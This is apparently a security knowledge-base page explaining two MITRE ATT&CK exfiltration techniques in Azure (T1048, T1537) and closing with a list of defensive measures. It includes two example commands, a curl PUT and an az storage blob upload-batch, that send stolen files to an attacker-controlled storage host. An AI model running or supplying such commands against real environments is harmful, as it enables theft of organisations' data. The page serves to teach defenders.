# Exfiltration TA0010

## **Exfiltration Techniques in Azure Environments**

In Microsoft Azure, adversaries use Exfiltration techniques to **transfer stolen data** outside the environment without triggering alarms.\
They might abuse alternative protocols (e.g., HTTPS, DNS tunneling) or transfer data to **attacker-controlled cloud accounts** to evade traditional exfiltration detections.

***

#### 🌐 Exfiltration Over Alternative Protocol

\| MITRE ID | **T1048** |

**Description**:\
Use non-standard or covert communication channels (e.g., HTTPS, DNS tunneling, cloud APIs) to exfiltrate data from Azure without raising alarms typically tuned for direct FTP, SMB, or other legacy protocols.

**Azure Example**:

* Exfiltrate stolen data using HTTPS via Azure Storage SDKs or custom HTTPS clients.
* Send stolen data out through DNS tunneling using compromised Azure VMs.

```bash
bashCopyEditcurl -X PUT https://attackerstorage.blob.core.windows.net/loot/file.txt --data-binary @stolen_data.txt
```

✅ **Result**: Data leaves Azure over trusted protocols (HTTPS), blending with normal traffic.

***

#### ☁️ Transfer Data to Cloud Account

\| MITRE ID | **T1537** |

**Description**:\
Transfer stolen data to an **attacker-controlled** Azure Subscription, AWS account, GCP bucket, or other cloud account.\
This looks like normal cloud-to-cloud traffic and is harder to detect than direct Internet exfiltration.

**Azure Example**:

* Upload collected data to an attacker-controlled Azure Storage Account or AWS S3 bucket:

```bash
bashCopyEditaz storage blob upload-batch --destination https://attackerstorage.blob.core.windows.net/loot --source ./loot
```

✅ **Result**: Data moves from victim Azure Subscription to attacker-controlled cloud infrastructure quietly.

***

## 📊 **Exfiltration Techniques in Azure (MITRE Mapped)**

| Technique/Subtechnique                 | MITRE ID | Azure Example                                                |
| -------------------------------------- | -------- | ------------------------------------------------------------ |
| Exfiltration Over Alternative Protocol | T1048    | Transfer data using HTTPS, DNS tunneling                     |
| Transfer Data to Cloud Account         | T1537    | Upload stolen data to attacker-controlled Azure/AWS accounts |

***

## 🎯 Final Summary

Defending against Exfiltration in Azure focuses on:

* **Monitoring outbound traffic for anomalies (even on HTTPS and cloud APIs)**
* **Detecting unusual storage transfers and uploads**
* **Locking down egress paths and enforcing data loss prevention (DLP) policies**
* **Watching for cross-subscription or cross-tenant data flows**



